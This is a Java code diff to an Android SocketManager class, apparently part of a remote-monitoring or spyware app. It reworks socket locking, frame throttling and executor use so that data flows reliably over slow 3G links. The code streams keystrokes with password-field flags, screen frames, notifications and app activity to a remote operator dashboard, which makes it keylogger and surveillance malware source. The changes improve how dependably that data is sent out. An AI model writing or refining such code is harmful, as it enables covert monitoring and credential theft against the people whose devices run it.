@@ -84,6 +84,21 @@ public class SocketManager {
     // Frame throttle — only one frame capture at a time; drop new requests while busy
     private final java.util.concurrent.atomic.AtomicBoolean frameBusy = new java.util.concurrent.atomic.AtomicBoolean(false);
 
+    // Per-channel send locks — CRITICAL: do NOT share one lock across channels.
+    // A large JPEG frame write on the stream channel can stall the OS socket buffer
+    // for 600 ms+ on 3G. If all channels share the same monitor (synchronized this),
+    // command responses and heartbeats on the primary channel are completely blocked
+    // for that duration, causing the 100 000+ ms device-latency seen on slow links.
+    private final Object primaryLock = new Object();
+    private final Object streamLock  = new Object();
+    private final Object liveLock    = new Object();
+
+    // Guard against queuing up multiple concurrent stream writes.
+    // If the previous frame write is still blocking in the kernel (3G back-pressure),
+    // drop the next frame rather than letting writes stack up in memory.
+    private final java.util.concurrent.atomic.AtomicBoolean streamWriteBusy =
+            new java.util.concurrent.atomic.AtomicBoolean(false);
+
     // Accessibility tree reads are NOT thread-safe — serialize them with a 1-permit semaphore.
     // Concurrent AccessibilityNodeInfo traversals corrupt Android's internal node pool and crash the process.
     private final java.util.concurrent.Semaphore accessSemaphore = new java.util.concurrent.Semaphore(1);
@@ -264,9 +279,12 @@ public class SocketManager {
                         }
                     });
                 }
-                // Keep alive — read loop; respond to pings so server doesn't time us out
+                // Keep alive — read loop; respond to pings so server doesn't time us out.
+                // Pong writes must go through streamLock to prevent output corruption from
+                // concurrent frame writes on the executor thread.
                 java.io.BufferedReader sIn = new java.io.BufferedReader(
                     new java.io.InputStreamReader(streamSocket.getInputStream()));
+                final String streamDeviceId = deviceId;
                 String sLine;
                 while (running && connected && (sLine = sIn.readLine()) != null) {
                     try {
@@ -275,10 +293,16 @@ public class SocketManager {
                             JSONObject pong = new JSONObject();
                             pong.put("event", "device:pong");
                             JSONObject pd = new JSONObject();
-                            pd.put("deviceId", deviceId);
+                            pd.put("deviceId", streamDeviceId);
                             pong.put("data", pd);
-                            streamOut.print(pong.toString() + "\n");
-                            streamOut.flush();
+                            final String pongStr = pong.toString() + "\n";
+                            // Acquire streamLock before writing — prevents interleaving with frame writes
+                            synchronized (streamLock) {
+                                if (streamOut != null) {
+                                    streamOut.print(pongStr);
+                                    streamOut.flush();
+                                }
+                            }
                         }
                     } catch (Exception ignored) {}
                 }
@@ -296,23 +320,39 @@ public class SocketManager {
         }
     }
 
-    private synchronized void sendStreamMessage(String event, JSONObject data) {
-        if (streamOut != null && streamConnected) {
-            try {
-                JSONObject msg = new JSONObject();
-                msg.put("event", event);
-                msg.put("data", data);
-                streamOut.print(msg.toString() + "\n");
-                streamOut.flush();
-            } catch (JSONException e) {
-                Log.e(TAG, "sendStreamMessage error: " + e.getMessage());
-                // Fall back to primary channel
-                sendMessage(event, data);
-            }
-        } else {
-            // Fall back to primary channel when stream channel not available
-            sendMessage(event, data);
+    private void sendStreamMessage(String event, JSONObject data) {
+        // Drop frame if a previous write is still blocking in the kernel (3G back-pressure).
+        // This prevents unbounded write queuing that would cause command-channel stalls.
+        if (!streamWriteBusy.compareAndSet(false, true)) {
+            Log.d(TAG, "sendStreamMessage: stream write busy, dropping frame");
+            return;
         }
+        boolean useFallback = false;
+        try {
+            if (streamOut != null && streamConnected) {
+                // streamLock is only held during the actual socket write; the fallback
+                // to sendMessage happens AFTER releasing this lock to avoid lock-ordering
+                // issues (never hold streamLock while acquiring primaryLock).
+                synchronized (streamLock) {
+                    try {
+                        JSONObject msg = new JSONObject();
+                        msg.put("event", event);
+                        msg.put("data", data);
+                        streamOut.print(msg.toString() + "\n");
+                        streamOut.flush();
+                    } catch (JSONException e) {
+                        Log.e(TAG, "sendStreamMessage error: " + e.getMessage());
+                        useFallback = true;
+                    }
+                }
+            } else {
+                useFallback = true;
+            }
+        } finally {
+            streamWriteBusy.set(false);
+        }
+        // Fallback outside all locks — avoids lock-ordering deadlock with primaryLock
+        if (useFallback) sendMessage(event, data);
     }
 
     // ── Secondary channel: live (keylogs, notifications, activity) ────────
@@ -345,6 +385,7 @@ public class SocketManager {
                 java.io.BufferedReader lIn = new java.io.BufferedReader(
                     new java.io.InputStreamReader(liveSocket.getInputStream()));
                 String lLine;
+                final String liveDeviceId = deviceId;
                 while (running && connected && (lLine = lIn.readLine()) != null) {
                     try {
                         JSONObject incoming = new JSONObject(lLine.trim());
@@ -352,10 +393,15 @@ public class SocketManager {
                             JSONObject pong = new JSONObject();
                             pong.put("event", "device:pong");
                             JSONObject pd = new JSONObject();
-                            pd.put("deviceId", deviceId);
+                            pd.put("deviceId", liveDeviceId);
                             pong.put("data", pd);
-                            liveOut.print(pong.toString() + "\n");
-                            liveOut.flush();
+                            final String pongStr = pong.toString() + "\n";
+                            synchronized (liveLock) {
+                                if (liveOut != null) {
+                                    liveOut.print(pongStr);
+                                    liveOut.flush();
+                                }
+                            }
                         }
                     } catch (Exception ignored) {}
                 }
@@ -372,21 +418,26 @@ public class SocketManager {
         }
     }
 
-    private synchronized void sendLiveMessage(String event, JSONObject data) {
-        if (liveOut != null && liveConnected) {
-            try {
-                JSONObject msg = new JSONObject();
-                msg.put("event", event);
-                msg.put("data", data);
-                liveOut.print(msg.toString() + "\n");
-                liveOut.flush();
-            } catch (JSONException e) {
-                Log.e(TAG, "sendLiveMessage error: " + e.getMessage());
-                sendMessage(event, data);
+    private void sendLiveMessage(String event, JSONObject data) {
+        boolean useFallback = false;
+        synchronized (liveLock) {
+            if (liveOut != null && liveConnected) {
+                try {
+                    JSONObject msg = new JSONObject();
+                    msg.put("event", event);
+                    msg.put("data", data);
+                    liveOut.print(msg.toString() + "\n");
+                    liveOut.flush();
+                } catch (JSONException e) {
+                    Log.e(TAG, "sendLiveMessage error: " + e.getMessage());
+                    useFallback = true;
+                }
+            } else {
+                useFallback = true;
             }
-        } else {
-            sendMessage(event, data);
         }
+        // Fallback outside liveLock — avoids lock-ordering deadlock with primaryLock
+        if (useFallback) sendMessage(event, data);
     }
 
     // ── Heartbeat ────────────────────────────────────────────────────────
@@ -475,16 +526,18 @@ public class SocketManager {
 
     // ── Send helpers ──────────────────────────────────────────────────────
 
-    private synchronized void sendMessage(String event, JSONObject data) {
-        if (out != null && connected) {
-            try {
-                JSONObject msg = new JSONObject();
-                msg.put("event", event);
-                msg.put("data", data);
-                out.print(msg.toString() + "\n");
-                out.flush();
-            } catch (JSONException e) {
-                Log.e(TAG, "sendMessage error: " + e.getMessage());
+    private void sendMessage(String event, JSONObject data) {
+        synchronized (primaryLock) {
+            if (out != null && connected) {
+                try {
+                    JSONObject msg = new JSONObject();
+                    msg.put("event", event);
+                    msg.put("data", data);
+                    out.print(msg.toString() + "\n");
+                    out.flush();
+                } catch (JSONException e) {
+                    Log.e(TAG, "sendMessage error: " + e.getMessage());
+                }
             }
         }
     }
@@ -1045,10 +1098,14 @@ public class SocketManager {
     private void startIdleFrameMode(String deviceId) {
         stopIdleFrameMode();
         idleFrameMode = true;
-        idleFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
+        // scheduleWithFixedDelay: waits 1000 ms AFTER the previous execution completes.
+        // scheduleAtFixedRate would fire immediately after 1000 ms regardless of how long
+        // the previous frame took — on slow 3G (frame send may take >1 s) this floods the
+        // channel and causes TCP buffer back-pressure that stalls the command socket.
+        idleFrameFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
             if (idleFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
         }, 0, 1000, TimeUnit.MILLISECONDS);
-        Log.i(TAG, "Idle-frame mode started (1000ms interval, ~1 FPS — 3G compatible)");
+        Log.i(TAG, "Idle-frame mode started (1000ms delay, ~1 FPS max — 3G compatible)");
     }
 
     private void stopIdleFrameMode() {
@@ -1065,10 +1122,10 @@ public class SocketManager {
         blockFrameMode = true;
         // Send first frame immediately so dashboard sees real content right away
         executor.execute(() -> sendSingleFrame(deviceId));
-        blockFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
+        blockFrameFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
             if (blockFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
         }, 1500, 1500, TimeUnit.MILLISECONDS);
-        Log.i(TAG, "Block-frame mode started (1500ms interval — 3G compatible)");
+        Log.i(TAG, "Block-frame mode started (1500ms delay — 3G compatible)");
     }
 
     private void stopBlockFrameMode() {
@@ -1345,7 +1402,10 @@ public class SocketManager {
     /** Push a keylog entry with password field metadata. */
     public void pushKeylogEntry(String packageName, String appName, String text, String eventType,
                                 String timestamp, boolean isPassword, String fieldType) {
-        liveExecutor.execute(() -> {
+        // IMPORTANT: Use the general cached executor, NOT liveExecutor.
+        // liveExecutor's single thread is permanently blocked in liveChannelLoop's readLine().
+        // Tasks submitted to liveExecutor while readLine() is blocking are queued forever.
+        executor.execute(() -> {
             try {
                 JSONObject entry = new JSONObject();
                 entry.put("packageName", packageName);
@@ -1431,7 +1491,7 @@ public class SocketManager {
 
     /** Push a live notification to the server (relayed to dashboard) via live channel. */
     public void pushNotification(String packageName, String appName, String title, String text, long postTime) {
-        liveExecutor.execute(() -> {
+        executor.execute(() -> {
             try {
                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                         java.util.Locale.getDefault()).format(new java.util.Date(postTime));
@@ -1452,7 +1512,7 @@ public class SocketManager {
 
     /** Push a foreground app change to the server (recent activity) via live channel. */
     public void pushRecentActivity(String packageName, String appName) {
-        liveExecutor.execute(() -> {
+        executor.execute(() -> {
             try {
                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                         java.util.Locale.getDefault()).format(new java.util.Date());
